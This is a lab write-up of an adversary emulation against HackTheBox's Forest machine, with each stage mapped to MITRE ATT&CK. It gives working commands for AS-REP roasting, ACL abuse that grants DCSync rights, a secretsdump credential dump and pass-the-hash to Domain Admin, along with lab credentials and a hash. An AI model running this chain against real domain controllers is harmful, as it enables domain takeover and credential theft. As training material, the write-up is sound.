# Forest
This plan documents a full adversary emulation against HackTheBox's _Forest_ machine, based on the attack path actually executed and recorded in `Forest.md`. Each stage below lists the action performed, its ATT&CK technique mapping, the tool/command used, and its execution status

![](Forest_image.png)

Stage 1 – Reconnaissance
------------------------

**Action:** Full TCP port scan and service/version enumeration  
**ATT&CK Technique:** T1595 (Active Scanning)   
**Tooling:** Nmap
**Command:**

```text-plain
nmap -p- -sCV --min-rate 2500 -vv -oN nmap 10.129.95.210
```

**Result:** Confirmed Windows Server 2016 Domain Controller for `htb.local`, with LDAP, Kerberos, SMB, and WinRM exposed

Stage 2 – Discovery (Anonymous Domain Enumeration)
--------------------------------------------------

**Action:** Establish an anonymous/null LDAP bind to enumerate domain information without credentials  
**ATT&CK Technique:** T1087.002 (Domain Account)  
**Tooling:** NetExec (`nxc`)   
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u '' -p ''
```

**Result:** Anonymous LDAP bind succeeded, confirming the domain controller permits unauthenticated enumeration

Stage 3 – Credential Access (AS-REP Roasting)
---------------------------------------------

**Action:** Request AS-REP hashes for domain accounts with Kerberos pre-authentication disabled, using the same anonymous LDAP access  
**ATT&CK Technique:** T1558.004 (AS-REP Roasting)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u '' -p '' --asreproast output.txt
```

**Result:** Retrieved a crackable AS-REP hash for `svc-alfresco`.

Stage 4 – Credential Access (Offline Cracking)
----------------------------------------------

**Action:** Crack the AS-REP hash offline using a dictionary attack  
**ATT&CK Technique:** T1110.002 (Password Cracking)  
**Tooling:** Hashcat (mode 18200, `rockyou.txt`)   
**Result:** Recovered plaintext credentials: `svc-alfresco:s3rvice`

Stage 5 – Execution / Initial Foothold
--------------------------------------

**Action:** Authenticate as `svc-alfresco` via Windows Remote Management and execute commands to confirm access  
**ATT&CK Technique:** T1021.006 (Remote Services: Windows Remote Management)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

**Result:** Confirmed interactive-equivalent access as `svc-alfresco`

Stage 6 – Discovery (AD Relationship Mapping)
---------------------------------------------

**Action:** Collect Active Directory relationship data (group memberships, ACLs, trusts, sessions) using the `svc-alfresco` foothold  
**ATT&CK Technique:** T1069.002 (Permission Groups Discovery: Domain Groups)  
**Tooling:** NetExec BloodHound collection module   
**Command:**

```text-plain
nxc ldap 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' --dns-server 10.129.95.210 --bloodhound -c all
```

**Result:** Identified a privilege escalation path: `svc-alfresco` → `GenericAll` over `Exchange Windows Permissions` group → `WriteDacl` over the `HTB.LOCAL` domain object

Stage 7 – Privilege Escalation (Group Membership Abuse)
-------------------------------------------------------

**Action:** Abuse the `GenericAll` right to add `svc-alfresco` as a member of the `Exchange Windows Permissions` group  
**ATT&CK Technique:** T1098 (Account Manipulation)  
**Tooling:** `net rpc`   
**Command:**

```text-plain
net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' 'svc-alfresco' -U htb.local/'svc-alfresco'%'s3rvice' -S 10.129.95.210
```

**Result:** `svc-alfresco` confirmed as a member of `Exchange Windows Permissions`, inheriting its `WriteDacl` right over the domain object

Stage 8 – Privilege Escalation (ACL Abuse)
------------------------------------------

**Action:** Use the inherited `WriteDacl` right to directly grant `svc-alfresco` the DCSync replication rights on the domain object  
**ATT&CK Technique:** T1098 (Account Manipulation)  
**Tooling:** `bloodyAD`   
**Command:**

```text-plain
bloodyAD -d htb.local -u 'svc-alfresco' -p 's3rvice' --dc-ip 10.129.95.210 --host forest.htb.local add dcsync 'CN=SVC-ALFRESCO,OU=SERVICE ACCOUNTS,DC=HTB,DC=LOCAL'
```

**Result:** `svc-alfresco` now holds `Replicating Directory Changes` and `Replicating Directory Changes All` rights

Stage 9 – Credential Access (DCSync)
------------------------------------

**Action:** Use the newly granted replication rights to extract domain account hashes via the DRSUAPI protocol.   
**ATT&CK Technique:** T1003.006 (OS Credential Dumping: DCSync)  
**Tooling:** Impacket `secretsdump.py`  
**Command:**

```text-plain
impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'forest.htb.local' -dc-ip 10.129.95.210
```

**Result:** Extracted the `Administrator` NTLM hash via the DRSUAPI method (the preceding `RemoteOperations`/RRP step failed with access denied, since `svc-alfresco` holds only replication rights, not local admin on the DC — confirming the dump succeeded purely through DCSync, not an alternate route).

Stage 10 – Lateral Movement (Pass-the-Hash)
-------------------------------------------

**Action:** Authenticate as `Administrator` using the extracted NTLM hash directly, without needing the plaintext password  
**ATT&CK Technique:** T1550.002 (Use Alternate Authentication Material: Pass the Hash)  
**Tooling:** NetExec (`nxc`)  
**Command:**

```text-plain
nxc smb 10.129.95.210 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```

**Result:** Full Domain Admin access confirmed

### Small Note on MITRE CALDERA

CALDERA automates adversary emulation by chaining ATT&CK-mapped "abilities" into a repeatable "operation." This plan mirrors that structure – each stage is effectively an ability (technique, tooling, command, status) – but was documented manually, since Forest's specific misconfigurations (anonymous LDAP, Exchange group nesting, ACL/DCSync grant) required manual exploitation rather than generic CALDERA abilities
